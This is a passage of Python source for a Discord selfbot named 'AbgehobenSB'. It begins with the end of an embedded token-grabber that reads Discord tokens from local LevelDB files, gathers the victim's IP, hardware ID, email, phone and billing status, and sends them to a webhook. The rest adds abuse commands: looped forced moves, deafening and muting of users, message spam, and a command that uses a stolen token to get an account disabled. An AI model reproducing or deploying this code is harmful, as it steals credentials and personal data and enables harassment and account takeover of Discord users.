        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", r"mfa\\.[\\w-]{84}"):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass
def whoami():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip
def HWID():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v8/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass
def main():
    cache_path = ROAMING + "\\\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoami()
    hwid = HWID()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(paymentMethods(token))
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{user_data.get('avatar')}.jpg"
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "Account Information",
                        "value": f'Email: {email}\\nPhone: {phone}\\nNitro: {nitro}\\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "PC Information",
                        "value": f'IP: {ip}\\nUsername: {pc_username}\\nPC Name: {pc_name}\\nHWID: {hwid}\\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "Token",
                        "value": token,
                        "inline": False
                    }
                ],
                "thumbnail": {
                    "url": ""
                },
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "AbgehobenSB | TokenGrabber",
        "avatar_url": "https://media.discordapp.net/attachments/793401060864819220/864932966887325696/unknown.png?width=409&height=468"
    }
    try:
        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
    except:
        pass
try:
    main()
except Exception:
    pass
'''
        with open(fname, 'w') as f:
           f.write('{}'.format(data))

randommove = False
randommoveall = False
automoveto = False
autoserverdeaf = False
autoserverundeaf = False
autoservermute = False
autoserverunmute = False
class voice(commands.Cog):
    """Voice chat commands;Most of this Commands will need Special permissions."""
    def __init__(self, client):
      self.client = client

    @Abgehoben.command(brief="randommoveall")
    async def randommoveall(self, ctx):
        """Auto moves all users to random Channels."""
        global randommoveall
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if randommoveall == True:
            randommoveall = False
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Random move all` disabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
        else:
            randommoveall = True
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Random move all` enabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.add_field(name='User',value=f"`everyone`",inline=True)
            embed.add_field(name='To Channel',value=f"`random`",inline=True)
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
            voiceclients = []
            for channel in ctx.guild.voice_channels:
                for member in channel.members:
                    voiceclients.append(member)
            while randommoveall:
                try:
                    for client1 in voiceclients:
                        await client1.edit(voice_channel=random.choice(ctx.guild.voice_channels))
                        await asyncio.sleep(0.5)
                except:
                    pass

    @Abgehoben.command(brief="randommove <member> (amount)")
    async def randommove(self, ctx, member: discord.Member=None, amount: int=99999999999999):
        """Auto moves selected user to random Channels."""
        global randommove
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if member == None:
            randommove = False
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Random move` disabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
        else:
            randommove = True
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Random move` enabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.add_field(name='User',value=f"`{member}`",inline=True)
            embed.add_field(name='To Channel',value=f"`random`",inline=True)
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
            while randommove:
                try:
                    await member.edit(voice_channel=random.choice(ctx.guild.voice_channels))
                    await asyncio.sleep(0.5)
                except:
                    pass

    @Abgehoben.group(brief="voicemanager <move/deaf/mute> <member>")
    async def voicemanager(self, ctx):
        """Voice management."""
        if ctx.invoked_subcommand == None:
            await ctx.send(f"⚠️ Please select one of this subcommands `move`, `deaf` or `mute`.", delete_after=2)

    @voicemanager.command(brief="voicemanager deaf <member>")
    async def deaf(ctx, member: discord.Member=None):
        """serverdeaf or serverundeaf a user."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if member == None:
            member = ctx.author

        if member.voice.deaf == False:
            try:
                await member.edit(deafen = True)
            except:
                pass
            temp="Deafen"
        elif member.voice.deaf == True:
            try:
                await member.edit(deafen = False)
            except:
                pass
            temp="Undeafen"
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"{temp} {member}.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.add_field(name='User',value=f"`{member}`",inline=True)
        embed.add_field(name='Type',value=f"`Deaf`",inline=True)
        embed.add_field(name='Action',value=f"`{temp}`",inline=True)
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        await send_message_in_mode(ctx, embed)

    @voicemanager.command(brief="voicemanager mute <member>")
    async def mute(ctx, member: discord.Member):
        """servermute or serverunmute a user."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if member == None:
            member = ctx.author

        if member.voice.mute == False:
            try:
                await member.edit(mute = True)
            except:
                pass
            temp="Muted"
        elif member.voice.mute == True:
            try:
                await member.edit(mute = False)
            except:
                pass
            temp="Unmuted"
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"{temp} {member}.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.add_field(name='User',value=f"`{member}`",inline=True)
        embed.add_field(name='Type',value=f"`Mute`",inline=True)
        embed.add_field(name='Action',value=f"`{temp}`",inline=True)
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        await send_message_in_mode(ctx, embed)

    @voicemanager.command(brief="voicemanager move <member> <channelid>")
    async def move(ctx, member: discord.Member=None, channel: int=None):
        """move a user."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if member != None:
            if channel != None:
                channel = discord.utils.get(ctx.guild.channels, id=channel)
                embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Moved {member} to `{channel}`", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
                embed.add_field(name='User',value=f"`{member}`",inline=True)
                embed.add_field(name='To Channel',value=f"{channel}",inline=True)
                embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
                embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
                await send_message_in_mode(ctx, embed)
                try:
                    await member.move_to(channel)
                except:
                    pass
            else:
                await ctx.send(f"⚠️ Channel ID is missing `(0 = Disconnect)`.", delete_after=2)
        else:
            await ctx.send(f"⚠️ Member is missing.", delete_after=2)

    @Abgehoben.group(brief="autovoicemanager <move/deaf/undeaf/mute/unmute> (@user)")
    async def autovoicemanager(self, ctx):
        """Automated Voice management."""
        if ctx.invoked_subcommand == None:
            await ctx.send(f"⚠️ Please select one of this subcommands `move`, `deaf`, `undeaf`, `mute` or `unmute`.", delete_after=2)

    @autovoicemanager.command(brief="autovoicemanager deaf (@user)")
    async def deaf(self, ctx, member: discord.Member=None):
        """Auto serverdeaf a user."""
        global autoserverdeaf
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if member == None:
            autoserverdeaf = False
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Auto deaf` disabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
        else:
            autoserverdeaf = True
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Auto deaf` enabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.add_field(name='User',value=f"`{member}`",inline=True)
            embed.add_field(name='Type',value=f"`Deaf`",inline=True)
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
            while autoserverdeaf:
                try:
                    if member.voice.deaf == False:
                        await member.edit(deafen = True)
                except:
                    pass
                await asyncio.sleep(0.3)

    @autovoicemanager.command(brief="autovoicemanager undeaf (@user)")
    async def undeaf(self, ctx, member: discord.Member=None):
        """Auto serverundeaf a user."""
        global autoserverundeaf
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if member == None:
            autoserverundeaf = False
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Auto undeaf` disabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
        else:
            autoserverundeaf = True
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Auto undeaf` enabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.add_field(name='User',value=f"`{member}`",inline=True)
            embed.add_field(name='Type',value=f"`Undeaf`",inline=True)
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
            while autoserverundeaf:
                try:
                    if member.voice.deaf == True:
                        await member.edit(deafen = False)
                except:
                    pass
                await asyncio.sleep(0.3)

    @autovoicemanager.command(brief="autovoicemanager mute (@user)")
    async def mute(self, ctx, member: discord.Member=None):
        """Auto servermute a user."""
        global autoservermute
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if member == None:
            autoservermute = False
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Auto mute` disabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
        else:
            autoservermute = True
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Auto mute` enabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.add_field(name='User',value=f"`{member}`",inline=True)
            embed.add_field(name='Type',value=f"`Mute`",inline=True)
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
            while autoservermute:
                try:
                    if member.voice.mute == False:
                        await member.edit(mute = True)
                except:
                    pass
                await asyncio.sleep(0.3)

    @autovoicemanager.command(brief="autovoicemanager unmute (@user)")
    async def unmute(self, ctx, member: discord.Member=None):
        """Auto serverunmute a user."""
        global autoserverunmute
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if member == None:
            autoserverunmute = False
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Auto unmute` disabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
        else:
            autoserverunmute = True
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Auto unmute` enabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.add_field(name='User',value=f"`{member}`",inline=True)
            embed.add_field(name='Type',value=f"`Unmute`",inline=True)
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
            while autoserverunmute:
                try:
                    if member.voice.mute == True:
                        await member.edit(mute = False)
                except:
                    pass
                await asyncio.sleep(0.3)

    @autovoicemanager.command(brief="autovoicemanager move (@user) (channelid)")
    async def move(self, ctx, member: discord.Member=None, channel: int=None):
        """Auto move a user."""
        global automoveto
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if member == None:
            automoveto = False
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Auto move` disabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
        else:
            if channel != None:
                channel = discord.utils.get(ctx.guild.channels, id=channel)
                embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Auto move` enabled.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
                embed.add_field(name='User',value=f"`{member}`",inline=True)
                embed.add_field(name='To Channel',value=f"`{channel}`",inline=True)
                embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
                embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
                await send_message_in_mode(ctx, embed)
                automoveto = True
                while automoveto:
                    try:
                        await member.move_to(channel)
                    except:
                        pass
                    await asyncio.sleep(0.3)
            else:
                await ctx.send(f"⚠️ Channel ID is missing `(0 = Disconnect)`.", delete_after=2)

class extensions(commands.Cog):
    """Custom commands;Fully customized by you (/Files/Extensions/)"""
    def __init__(self, client):
      self.client = client

    for file in os.listdir('Files/Extensions'):
        if file.endswith(".py"):
            variables.loadedcustomextensions += 1
            exec(open(f'./Files/Extensions/{file}', encoding="utf-8").read())
    if variables.loadedcustomextensions == 0:
        None
    elif variables.loadedcustomextensions == 1:
        print (f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}LOG{theme.color1}]{theme.color2} Loaded {theme.color1}{variables.loadedcustomextensions} {theme.color2}extension.")
    elif variables.loadedcustomextensions > 1:
        print (f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}LOG{theme.color1}]{theme.color2} Loaded {theme.color1}{variables.loadedcustomextensions} {theme.color2}extensions.")
class utility(commands.Cog):
    """Utility commands; Utility Commands"""
    def __init__(self, client):
      self.client = client

    @Abgehoben.command(brief="spam <Amount of Messages> <Custom Message>")
    async def spam(self,ctx, amount:int, *, message):
        """Spam your Chat"""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        for i in range(amount): 
            await ctx.send(message)

    @Abgehoben.command(brief="disabletoken <token>")
    async def disabletoken(self, ctx, disabletoken):
        """Disable Discord Account with Token"""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        token = disabletoken
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        res = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
        
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Discord Token Disabler`", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.add_field(name='User',value=f"`{res['username']}`",inline=True)
        embed.add_field(name='ID',value=f"`{res['id']}`",inline=True)
        embed.add_field(name='Status', value="Disabling Account...")
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        disablestatus = await ctx.send(embed=embed)
        for username in open('Files/users.txt', 'r').read().splitlines():
            try:
                usr = username.split('#')
                r = requests.post('https://discord.com/api/v8/users/@me/relationships', headers=headers, json={'username': usr[0], 'discriminator': usr[1]})
                disabled = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Discord Token Disabler`", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
                disabled.add_field(name='Disabled!',value=f"`{res['username']}`",inline=True)
                disabled.add_field(name='Disabled ID',value=f"`{res['id']}`",inline=True)
                await disablestatus.edit(embed=disabled)
                
                
            except:
                disabled = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Discord Token Disabler`", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
                embed.add_field(name='Error Couldnt disable',value=f"`{res['username']}`",inline=True)
                embed.add_field(name='ID of Target',value=f"`{res['id']}`",inline=True)
                await disablestatus.edit(embed=disabled)
                
    @Abgehoben.command(brief="deletewebhook <webhook>") 
    async def deletewebhook(self,ctx, webhook):
        """delete Webhook"""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass 
        requests.delete(f"{webhook}")
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Webhook Deleter`", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.add_field(name='Webhook',value=f"`{webhook}`",inline=True)
        embed.add_field(name='Status', value="Deleted!")
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        await send_message_in_mode(ctx, embed)
    @Abgehoben.command(brief="fakedata")
    async def fakedata(self,ctx):
        """Generates Fake Data"""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass 
        faker = Faker('de_DE')
        embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"`Fake Data`", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
        embed.add_field(name='Name',value=f"`{faker.first_name()} {faker.last_name()}`",inline=True)
        embed.add_field(name='Address', value=f"`{faker.address()}`")
        embed.add_field(name='Mobile Number', value=f"`{faker.phone_number()}`")
        embed.add_field(name='E-Mail', value=f"`{faker.free_email()}`")
        embed.add_field(name='IPv4-Address', value=f"`{faker.ipv4()}`")
        embed.add_field(name='MAC', value=f"`{faker.mac_address()}`")
        embed.add_field(name='Date of Birth', value=f"`{faker.date_of_birth()}`")
        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
        await send_message_in_mode(ctx, embed)

    @Abgehoben.command(brief="chatexport")
    async def chatexport(self,ctx):
        """Export your Chat"""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        if discord.channel is discord.DMChannel:
            channel = discord.DMChannel
            transcript = await chat_exporter.export(channel=channel, set_timezone="Europe/Berlin")
            if transcript is None:
                return

            transcript_file = discord.File(io.BytesIO(transcript.encode()),filename=f"transcript.html")
            await ctx.send(file=transcript_file)
        else:
            try:
                channel = ctx.channel
                transcript = await chat_exporter.export(channel=channel, set_timezone="Europe/Berlin")
                if transcript is None:
                    return

                transcript_file = discord.File(io.BytesIO(transcript.encode()),filename=f"transcript-{ctx.channel.name}.html")
                await ctx.send(file=transcript_file)
            except Exception as e:
                print(e)
    
    @Abgehoben.command(brief="levelup (Amount of Messages) (Custom Message) ")
    async def levelup(self, ctx, amount: int,*,customsg):
        """"Level Up on your Favourite servers"""
        def scale(time):
            defined = 60
            for unit in ["m", "h"]:
                if time < defined:
                    return f"{time:.2f}{unit}"
                time /= defined
        
        
        await ctx.message.delete()
        msgsend = amount
        while msgsend > 0:
            try:
                msgsend -= 1
                print(f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}LOG{theme.color1}]{theme.color2} Message sent! | Messages left to send: {msgsend} {theme.color1}| Estimated Time: {theme.color2}{scale(msgsend)}")
                if msgsend == 0:
                 print(f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}LOG{theme.color1}]{theme.color2} All Messages sent! {theme.color1}Nice! {theme.color2}")    
                output = f"{customsg}"
                await ctx.send(output)
            except:
                print(f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}LOG{theme.color1}]{theme.color2} Cannot send message {msgsend} {theme.color1}{theme.color2}")
                
                pass
            await asyncio.sleep(1)
            async for message in ctx.message.channel.history(limit=1).filter(lambda m: m.author == client.user).map(lambda m: m):
                try:
                    await message.delete()
                except:
